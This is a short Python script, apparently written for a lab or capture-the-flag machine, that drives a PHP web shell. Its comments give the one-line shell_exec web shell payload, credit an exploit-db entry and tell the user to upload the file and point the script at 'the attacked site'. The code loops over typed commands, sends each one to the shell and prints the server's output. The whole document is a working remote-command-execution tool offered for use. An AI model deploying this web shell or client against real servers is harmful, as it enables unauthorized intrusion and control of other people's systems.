# Example usage: 
# Upload php file with content `<?php echo shell_exec($_GET[\'cmd\']); ?>` to server.
# (credits to https://www.exploit-db.com/exploits/47887)
# Proof of Concept: Call the php file from your browser with `http://..../file.php?cmd=whoami`
# before use: in code, adapt the `url` to match the attacked site + filename. Then run `python3 RCE-shell.py`. 

import urllib.parse

import requests

url = 'http://10.10.171.162/bootstrap/img/file.php?cmd='

runme = True

while runme:
    command = input('waiting for command. Exit with exit()\n')
    if command == 'exit':
        print('exiting...')
        runme = False
    else:
        url_encoded_command = urllib.parse.quote(command)
        res = requests.get(url + url_encoded_command)
        print(res.text)
